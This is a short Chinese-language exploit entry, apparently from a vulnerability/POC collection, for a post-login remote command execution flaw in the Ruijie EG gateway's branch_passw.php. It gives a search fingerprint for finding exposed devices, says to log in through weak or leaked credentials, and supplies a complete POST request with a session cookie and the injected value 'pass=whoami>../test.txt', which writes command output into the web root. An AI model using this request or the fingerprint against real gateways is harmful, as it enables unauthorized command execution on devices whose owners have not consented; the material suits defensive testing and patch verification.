# 锐捷EG易网关branch_passw.php远程代码执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Ruijie-EG易网关"`
- **请求**：`POST /itbox_pi/branch_passw.php?a=set HTTP/1.1`

**请求体 / payload**
```
**一、漏洞简介**\
锐捷 EG易网关cli存在后台远程命令执行漏洞。\
**二、影响版本**\
`锐捷EG易网关`\
**三、资产测绘**\
`app="Ruijie-EG易网关"`\
●登录页面
**四、漏洞复现**\
1、通过弱口令或账号密码泄露漏洞登录后台获取cookie
2、branch\_passw.php执行whoami命令，写入web根目录test.txt文件，再访问test.txt文件得到回显。
Host: {{Hostname}}
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=e2iuc40kc25v8bosaf04ee7273; user=admin; helpKey=home_sys
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
pass=whoami>../test.txt
3、写入文件地址
/test.txt
```